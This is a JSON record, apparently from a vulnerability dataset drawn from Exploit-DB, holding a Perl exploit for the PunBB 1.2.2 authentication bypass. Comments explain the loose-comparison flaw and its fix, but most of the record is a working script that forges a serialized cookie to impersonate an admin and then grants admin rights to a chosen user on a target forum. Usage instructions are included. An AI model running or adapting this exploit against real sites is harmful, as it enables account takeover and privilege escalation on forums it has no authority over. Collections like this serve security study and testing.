{
  "id": "901",
  "title": "PunBB 1.2.2 - Authentication Bypass",
  "cve": null,
  "vuln_type": "auth_bypass",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\n#\r\n#   PunBB version <= 1.2.2 auth bypass exploit\r\n#\r\n# -------------------------------------------------\r\n# About vuln:\r\n# lets look file /include/functions.php\r\n# ### code start ###\r\n# function check_cookie(&$pun_user)\r\n# {\r\n# ...\r\n# if (isset($_COOKIE[$cookie_name]))\r\n# list($cookie['user_id'], $cookie['password_hash']) = @unserialize($_COOKIE[$cookie_name]);\r\n#\r\n# if ($cookie['user_id'] > 1)\r\n# {\r\n# // Check if there's a user with the user ID and password hash from the cookie\r\n# $result = $db->query('SELECT .... tra-la-la... );\r\n# $pun_user = $db->fetch_assoc($result);\r\n# \r\n# // If user authorisation failed\r\n# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash'])\r\n# ...                                                                    ^^^ HERE !!!\r\n# ### code end ###\r\n# and we can logging with any user id if we use boolean value in cookie password_hash \r\n# evil cookie is : a:2:{i:0;s:1:\"2\";i:1;b:1;} where 2 is user id\r\n# \r\n# fix:\r\n# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash'])\r\n# change to\r\n# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) !== $cookie['password_hash'])\r\n# -------------------------------------------------\r\n# (c)oded by 1dt.w0lf // 09.03.2005 // r57 // www.rst.void.ru\r\n# -------------------------------------------------\r\n# example:\r\n# r57punbb.pl nerf.ru /forum/ 2 47\r\n# + Exploit success!\r\n# + Group membership saved!\r\n# + Now user with id=47 have admin level!\r\n# ja-ja-ja dast ist fantastish =)\r\n# ------------------------------------------------\r\n\r\n$server    = $ARGV[0];\r\n$folder    = $ARGV[1];\r\n$admin_uid = $ARGV[2];\r\n$user_uid  = $ARGV[3];\r\n$suc = 0;\r\nif (@ARGV < 4 || $admin_uid =~ /[^\\d]/ || $user_uid =~ /[^\\d]/)\r\n{\r\n print q{\r\n       PunBB version <= 1.2.2 auth bypass exploit \r\n ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n usage: r57punbb.pl [host] [/folder/] [admin_id] [user_id]\r\n\r\n [host]     - hostname where punbb installed\r\n [/folder/] - folder where punbb installed\r\n [admin_id] - id of user who have admin rights\r\n [user_id]  - user with this id get admin level after \r\n              success exploiting\r\n ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n r57 private code // rst.void.ru\r\n };\r\n exit();\r\n}\r\n$server =~ s/^((?:http:\\/\\/)*)([^\\/]*)(\\/*)$/$2/;\r\n$str    = 'Group membership saved';\r\n$cook   = 'a:2:{i:0;s:'.length($admin_uid).':\"'.$admin_uid.'\";i:1;b:1;}';\r\n$data   = 'form_sent=1&group_id=1&update_group_membership=Save';\r\n$cook   =~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\") || die \"$socket error $!\";\r\nprint $socket \"POST ${folder}profile.php?section=admin&id=$user_uid&action=foo HTTP/1.0\\n\";\r\nprint $socket \"Host: $server\\n\";\r\nprint $socket \"Referer: http://$server${folder}profile.php?section=admin&id=$user_uid\\n\";\r\nprint $socket \"Cookie: punbb_cookie=$cook\\n\";\r\nprint $socket \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $socket \"Content-Length: \".length($data).\"\\n\\n\";\r\nprint $socket \"$data\\n\\n\";\r\nwhile(<$socket>){ if(/$str/) { $suc = 1; last; } }\r\n($suc)?(print \"+ Exploit success!\\n+ $str!\\n+ Now user with id=$user_uid have admin level!\\n\")\r\n      :(print \"- Exploit failed\\n\")\r\n      \r\n#--- EOF ---\r\n\r\n# milw0rm.com [2005-03-29]",
  "url": "https://www.exploit-db.com/exploits/901"
}